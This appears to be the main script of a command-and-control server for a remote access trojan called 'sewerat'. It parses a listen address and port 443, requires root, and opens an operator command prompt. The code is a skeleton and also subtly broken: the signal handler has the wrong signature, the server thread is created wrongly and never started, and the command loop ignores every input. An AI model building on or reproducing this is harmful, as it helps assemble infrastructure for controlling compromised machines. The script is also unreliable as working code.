import argparse
import signal
import sys
from queue import Queue
from threading import Thread

from program import COLORS, check_root, show_ascii_logo, start_server


def get_args():
    parser = argparse.ArgumentParser(description="A C2 server for sewerat.",
                                     prog="seweratc2")
    parser.add_argument("host",
                        help="The IP address to listen on",
                        metavar="[HOST]",
                        default="0.0.0.0",
                        nargs='?')
    parser.add_argument("port",
                        help="The port to listen on.",
                        metavar="[PORT]",
                        default=443,
                        action="store",
                        nargs='?')

    args = parser.parse_args()

    host = args.host
    port = args.port

    return (host, port)


def main():
    # no more stack trace when you hit ctrl-c
    def handler():
        sys.exit(0)

    signal.signal(signal.SIGINT, handler)

    check_root()

    host, port = get_args()
    port = int(port)
    show_ascii_logo()

    queue = Queue()

    # Spawn server in another thread.
    Thread(target=start_server(), args={
        queue,
    })
    prompt = "sewerat"

    while True:
        command = input(f"{COLORS[1]}{prompt} > ").strip()


if __name__ == "__main__":
    main()
